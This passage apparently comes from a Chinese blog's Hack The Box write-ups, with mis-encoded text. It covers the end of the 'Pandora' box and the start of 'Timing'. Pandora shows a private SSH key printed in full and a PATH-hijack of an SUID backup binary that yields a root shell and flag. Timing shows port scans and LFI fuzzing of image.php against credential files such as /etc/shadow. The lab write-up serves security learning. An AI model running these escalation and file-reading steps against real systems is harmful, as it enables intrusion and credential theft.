setresuid(0, -1, -1): Operation not permitted\nsudo: unable to initialize policy plugin\n```\nç›´æ¥åˆ©ç”¨ä¼šé”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell\n\nç”±äºæˆ‘ä»¬æ²¡æœ‰mattçš„å¯†ç ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ç”¨sshç™»å½•ï¼Œä¹Ÿæ²¡æ‰¾åˆ°sshçš„ç§˜é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±ç”Ÿæˆä¸€ä¸ª\n\n```bash\nmatt@pandora:/home/matt$ ssh-keygen\nssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/matt/.ssh/id_rsa): \n\nEnter passphrase (empty for no passphrase): \n\nEnter same passphrase again: \n\nYour identification has been saved in /home/matt/.ssh/id_rsa\nYour public key has been saved in /home/matt/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:SDMstiuKB3DRqypXDzX385OV0v8MrIh+lQE0alNduQ4 matt@pandora\nThe key's randomart image is:\n+---[RSA 3072]----+\n|   .     .+. ... |\n|  . ..   o... .  |\n|   .o.= +  .   . |\n|. ...+o=..  E .  |\n|.. ....oS.   * . |\n|. . o.    o +.=  |\n| o...o     + +o. |\n|+.o.  .  ...+. o.|\n|+o     .o.. ..  +|\n+----[SHA256]-----+\n```\n```bash\nmatt@pandora:/home/matt$ cd .ssh\ncd .ssh\nmatt@pandora:/home/matt/.ssh$ ls\nls\nid_rsa  id_rsa.pub\nmatt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys\ncat id_rsa > authorized_keys\nmatt@pandora:/home/matt/.ssh$ chmod 700 authorized_keys\nchmod 600 authorized_keys\n```\n```bash\nmatt@pandora:/home/matt/.ssh$ cat id_rsa\ncat authorized_keys\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# vim id_rsa    \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# chmod 700 id_rsa    \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat id_rsa     \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAwUKNz2Ov2tYQjOYPEreHt7g8wqnQaGJAkvpbi5+9r/T1iOXbq/hu\nEvBnHFk94YXL8UxwhTHzIoa0diY+XH+/eFwfi8cPTpn+yHtNMNmCOMtu7LBsM75UjAPqa2\n56rfc+OVfWvayg6cdKXZ9tynO90Dfn5LxzyZxJDm59GKcDOY5Xip/s0YM41WvHxXjBfdZm\nhdVRsXGBCfe/kMqDQcWWqZ/CZsRa/ME7zjO04OQb9WEPrvluaXsykH1ckuhPuc9TXqNU/n\nlciexINkoC+RUT0eJtTRmeGU35v3L2VM4yckaaTLMp1jsJjSqQkkP46tr3wJoPmikmQHX8\n02ssMv74mU3PKoIWREMG7HTXWakyQdhy2kuONnJGNu7VMKIrbBR/NTl5AKOPlZHeiXc+0u\nqRapeNvLoECvCTYGcJ0dsCcT78FhuIa2chFbL+vb7RMDmA6Q1ibLPj5hLZO6z+n/o3hJ4e\n36SnXexYvVsvi8SmxWSo1B++vJck/xCRsUtOtlmpAAAFiAT0arUE9Gq1AAAAB3NzaC1yc2\nEAAAGBAMFCjc9jr9rWEIzmDxK3h7e4PMKp0GhiQJL6W4ufva/09Yjl26v4bhLwZxxZPeGF\ny/FMcIUx8yKGtHYmPlx/v3hcH4vHD06Z/sh7TTDZgjjLbuywbDO+VIwD6mtueq33PjlX1r\n2soOnHSl2fbcpzvdA35+S8c8mcSQ5ufRinAzmOV4qf7NGDONVrx8V4wX3WZoXVUbFxgQn3\nv5DKg0HFlqmfwmbEWvzBO84ztODkG/VhD675bml7MpB9XJLoT7nPU16jVP55XInsSDZKAv\nkVE9HibU0ZnhlN+b9y9lTOMnJGmkyzKdY7CY0qkJJD+Ora98CaD5opJkB1/NNrLDL++JlN\nzyqCFkRDBux011mpMkHYctpLjjZyRjbu1TCiK2wUfzU5eQCjj5WR3ol3PtLqkWqXjby6BA\nrwk2BnCdHbAnE+/BYbiGtnIRWy/r2+0TA5gOkNYmyz4+YS2Tus/p/6N4SeHt+kp13sWL1b\nL4vEpsVkqNQfvryXJP8QkbFLTrZZqQAAAAMBAAEAAAGAYun0eQw1qpTbvbHWTyceUJr8hk\nmyAGshT9jR2CG3TYLb1OiIyXkKpajjrW/Dq1T2sBcGlDWfkrFNVhd23ZMI5cqI3trQa9OH\nwwbQ2ErLStRcfspBZy5oSY2Lgtb19WpRL7pUj5n2dhDpcAe0guVAZnzmtHz76lmSTs+gOW\njpzqCbD7mQ1R8LjLhwdBK9PfHpYWBwQpisifSC2NG94oEF/uVk84JWa31fZcezMVOvN6Up\nCM5jg5tpouh25D4A6EJDLT8F1fYxBRa2HdcX9rjhoabn+g0GTasUQfzBQAwAB5H2OX+xHm\nICsG8Rl3FQdnRKSY4e9jsCT/ZcQRju07nSlzWfKWIkWT+kMYP6LejPgvwFNFQQHeLPM5rb\nepc1hCZ5XTCUyZXD0XSRqh8Am8H5ZY2ZfwrWwqxFSzRgnOV4gFm99V56WLDZ/Lzk5Cib4n\nOgBdqKzwifxY45GxcZD3Fp7sT0lPiGQaHROYzReg2BTtj7iPjUxNUmWw+G6sO66pDNAAAA\nwQDn6URSHsvxBnikQX8twCiwY1LDnrrrwZhm1f6R2yXpWD5//9HsRMCvYBy/14bp4O1b+l\n1zuOwgKwJocfVXwJXhP8ui6PbbMHlknx+veZd9MzjeFmbYYJ5TAG5iyrLtJIapTf+nsg8z\nwKRhr8xEMiCKse0vsHlNrf7FrVzYC3RtM08jL0kb533gGMjmOUYkkIXZoIRCw1O1v8LysW\n0YfOzmQLBhsqr1Kt08rIOGzI+Euk3lNHdT4Y4ruqP23RHruFkAAADBAPmPQmsR8V2N6hG3\n8ko2jCLjBcRsBVnqPcdY/t1wdIZv0amcURk7Xgf6ZFsLjdte9TE3q6zivlFiI3QhnAPwuA\nsBpZum+36j/zdGuu4j2ZYcZ5iNybsTNv+h+vEILuY92i7IW9zxJOSBW42MFAKbe9ApHQbX\nntYMXUShT3kOeccC9NBYBwcZurSokF8t915c8VV1Bl0y8polkPbV4eaRKhjQratrTTs7KC\nhKdFfzhxBWd12PCMQXORHbw103Yv7A7wAAAMEAxj9YaJ5qOY0W2SJjP1YizMAvDrYQw1kB\nFX/xjZDUclCXiXQ6HUSIbr6MIXZYTYTnOymDRM586hqd9hYlpM4E1dKsZK3dOX1/134FNE\n+k+iJLxmf89YWfjJRk6xo528B8KoDhtyh7C5uHC/DTGdyUlJHvscC9YAjt3ELsr3eeA1YP\nDHWXsucaZec6QfrteMEPJEVD2PRa5i1bAMjDTb4AVLGVLomR/Dnw4gLDtoujsTjSlxUY7g\nGeRu3MTcDq6d7nAAAADG1hdHRAcGFuZG9yYQECAwQFBg==\n```\nç„¶åä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh matt@pandora.htb -i id_rsa\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 05:59:56 UTC 2022\n\n  System load:  0.09              Processes:             280\n  Usage of /:   63.0% of 4.87GB   Users logged in:       1\n  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nmatt@pandora:~$ whoami&&id\nmatt\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n```\nåˆ‡æ¢åˆ°mattçš„ç”¨æˆ·ç›®å½•ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå‡çš„tarå¯æ‰§è¡Œæ–‡ä»¶ï¼Œï¼Œå¹¶å°†mattçš„å®¶è·¯å¾„æ³¨å…¥PATHå˜é‡ä¸­\n\n```bash\ncd /home/matt/\necho \"/bin/bash\" > tar\nchmod +x tar\nexport PATH=/home/matt:$PATH\n```\nç„¶åè¿è¡Œ/usr/bin/pandora\\_backupæ–‡ä»¶\n\n```bash\nmatt@pandora:~$ /usr/bin/pandora_backup\nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:~# whoami&&id\nroot\nuid=0(root) gid=1000(matt) groups=1000(matt)\n```\næˆåŠŸææƒåˆ°rootç”¨æˆ·\n\n```bash\nroot@pandora:~# cd /root\nroot@pandora:/root# ls\nroot.txt\nroot@pandora:/root# cat root.txt \n262d5cfca2599a11b0c1dcfa552a150e\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Timing - Hackthebox","url":"/2022/01/01/Hackthebox/Medium/Hackthebox-Timing/","content":"\n# Hackthebox - Timing\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Timing/3f90e5fc-5165-447e-ba8d-10d2d71bef4b.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Timing/a6ecbfb1-1f6d-4741-a9c8-79a1d5a38651.jpeg)\n\n## ä¿¡æ¯æœé›†\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 00:09 EST\nNmap scan report for bogon (10.10.11.135)\nHost is up (0.28s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)\n|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)\n|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/14%OT=22%CT=1%CU=39140%PV=Y%DS=2%DC=T%G=Y%TM=61B828\nOS:78%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=F9%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3\nOS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                             \n\nTRACEROUTE (using port 5900/tcp)                                                                                                                                                                                    \nHOP RTT       ADDRESS                                                                                                                                                                                               \n1   278.35 ms 10.10.14.1                                                                                                                                                                                            \n2   278.35 ms bogon (10.10.11.135)                                                                                                                                                                                  \n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                               \nNmap done: 1 IP address (1 host up) scanned in 347.67 seconds\n```\nå…ˆå»80ç«¯å£çœ‹çœ‹æ˜¯ä»€ä¹ˆæœåŠ¡\n\n![](Hackthebox-Timing/ba83c4f8-90f8-41a5-b1db-a4e0c3b1ca75.png)\n\nè¿™æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæµ‹è¯•ä¸€ä¸‹å¼±å£ä»¤æ²¡æœ‰çªç ´å£ï¼Œæ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.135/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Extensions       : .php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nlogin.php               [Status: 200, Size: 5609, Words: 1755, Lines: 178]\nimages                  [Status: 301, Size: 313, Words: 20, Lines: 10]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1]\njs                      [Status: 301, Size: 309, Words: 20, Lines: 10]\ncss                     [Status: 301, Size: 310, Words: 20, Lines: 10]\nprofile.php             [Status: 302, Size: 0, Words: 1, Lines: 1]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nimage.php               [Status: 200, Size: 0, Words: 1, Lines: 1]\nupload.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nheader.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nfooter.php              [Status: 200, Size: 3937, Words: 1307, Lines: 116]\n.                       [Status: 302, Size: 0, Words: 1, Lines: 1]\ndb_conn.php             [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [86006/86006] :: Job [1/1] :: 70 req/sec :: Duration: [0:17:21] :: Errors: 8 ::\n```\nè¿™è¾¹æ²¡æœ‰è·³è½¬çš„åªæœ‰ä¸€ä¸ªimage.phpï¼Œä½†æ˜¯æ˜¯ç©ºç™½çš„ï¼ŒåŒæ—¶è¿˜å­˜åœ¨ä¸€ä¸ªimagesç›®å½•ï¼Œæˆ‘æ„Ÿè§‰è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œå»çœ‹çœ‹imagesç›®å½•æœ‰å•¥ä¸œè¥¿\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.135/images/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/images/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Extensions       : .php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nuploads                 [Status: 301, Size: 321, Words: 20, Lines: 10]\n:: Progress: [86006/86006] :: Job [1/1] :: 78 req/sec :: Duration: [0:15:38] :: Errors: 4 ::\n```\nç›®å½•/images/uploads/ç›®å½•ï¼Œç„¶åè¿˜å­˜åœ¨ä¸€ä¸ªimage.phpæ–‡ä»¶ï¼Œæˆ‘æ€»è§‰å¾—æ˜¯è¿™ä¸ªç›®å½•å†…çš„æ–‡ä»¶ï¼Œæ˜¯é€šè¿‡image.phpè¿™ä¸ªæ–‡ä»¶æ¥æŸ¥çœ‹çš„ï¼Œfuzzä¸€ä¸‹çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.135/image.php?file=FUZZ\" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/image.php?file=FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n/etc/httpd/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftpchroot          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/grub.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/chrootUsers        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/apache2/apache2.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/shadow             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/fstab              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftphosts           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/ftp    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/groups             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cron.deny          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/access.conf  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/inetd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/srm.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cron.allow         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/at.allow           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/httpd.conf   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/aliases            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lighttpd.conf      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/chttp.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/issue              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/anacrontab         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/php.ini      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/mysql/my.cnf       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lilo.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/npasswd            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/profile            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/crontab            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cups/cupsd.conf    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pureftpd.passwd    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/networks           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/bashrc             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lsb-release        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/my.cnf             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4.4/fcgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pureftpd.pdb       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/php4/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/samba/smb.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_config     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/sysconfig/network  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftpaccess          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/apache2/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/modules.conf       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php5/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/termcap            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/cgi/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd.chroot_list [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/resolv.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php.ini            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/my.conf            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/cpuinfo           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/filesystems       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/interrupts        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/ioports           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/syslog.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/modules           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/stat              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/vsftpd.conf        [Status: 200, Size: 0, Words: 1, Lines: 